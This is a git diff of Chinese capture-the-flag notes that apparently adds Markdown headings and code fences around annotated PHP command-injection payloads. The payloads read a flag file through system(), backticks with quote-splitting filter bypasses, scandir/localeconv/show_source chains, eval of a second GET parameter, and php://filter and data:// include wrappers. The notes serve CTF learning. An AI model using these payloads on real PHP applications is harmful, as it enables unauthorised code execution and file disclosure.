@@ -81,7 +81,9 @@ c=system("tac fl*g.php"); //倒叙（行）显示文件内容
 
 echo `cat fl''ag.p''hp`; // 反引号执行命令， 用单引号绕过flag,php不能打印的限制，需要采用view-source协议，无法对命令cat本身进行这种操作
 echo `nl fl''ag.php` // nl给每个输出加上行号
-
+```
+进阶:<br>
+```php
 c=echo scandir(".")[2]; //打印当前目录下的文件，第三个元素
 c=highlight_file(next(array_reverse(scandir(".")))); //查看当前目录下的文件，倒序后，取第二个元素，然后高亮显示
 c=show_source(next(array_reverse(scandir(pos(localeconv()))))); // 十分牛逼，localeconv的第一个元素是'.'，即当前目录，pos是current的别名，返回数组第一个元素，然后scandir读取当前目录，array_reverse倒序，next取下一个元素（即倒数第二个元素），show_source是highlight_file的别名显示源码
@@ -103,8 +105,9 @@ c=show_source(next(array_reverse(scandir(pos(localeconv()))))); // 十分牛逼�
 // prev()将内部指针指向数组中的上一个元素，并输出。
 // reset()将内部指针指向数组中的第一个元素，并输出。
 // each()返回当前元素的键名和键值，并将内部指针向前移动。
-
-
+```
+还有高手！<br>
+```php
 c=eval($_GET[a]);&a=system('cat flag.php');//传入两个参数，c用于绕过校验，a才是真正的命令执行
 
 //用include包含一个文件，文件名称由参数1决定，%0a主要是因为不能用空格分割关键字和包含文件名称了（去掉%0a也无所谓,似乎eval内会自动对include和文件名称添加空格来分隔）
@@ -112,7 +115,9 @@ c=eval($_GET[a]);&a=system('cat flag.php');//传入两个参数，c用于绕过�
 //php://filter/convert.base64-encode/resource=flag.php 是 PHP 中的一种流封装协议，允许你对流（例如文件读取）应用过滤器。这里就是对flag.php进行base64编码
 c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php 
 c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
-
+```
+还有更高手！<br>
+```php
 // data:// 这是一个数据URI方案的一部分。数据URI方案允许将小片段的数据直接嵌入到网页中，而不需要外部资源的引用
 // text/plain: 这部分指定了数据的类型。在这个案例中，text/plain 表示数据是普通文本
 // ;base64: 这部分指定了数据的编码方式。在这个案例中，base64 表示数据是使用 Base64 编码的
